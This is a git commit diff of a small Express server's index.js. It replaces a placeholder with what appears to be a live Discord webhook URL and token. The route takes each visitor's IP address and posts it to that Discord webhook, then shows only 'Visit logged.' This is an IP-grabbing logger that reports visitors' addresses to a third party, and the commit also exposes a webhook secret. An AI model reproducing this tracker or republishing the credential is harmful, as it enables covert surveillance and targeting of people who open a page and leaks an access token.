cdebaa89915ea621f0b180d17809afd1da40f7f6
SurnameForfm32 <ongodskibidi@gmail.com>
2025-04-03 19:57:07 +0200

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ const app = express();
 
 app.get('/', async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  await axios.post('YOUR_DISCORD_WEBHOOK_URL', {
+  await axios.post('https://discord.com/api/webhooks/1357413546534768870/lxuFJCUHsa1FdwLkomBEdF77gFiWQrtcgTCbGsZmDo-N73Da5giayiVb3bCCcAoF6jpZ', {
     content: `📥 New visit from IP: ${ip}`,
   });
   res.send('Visit logged.');
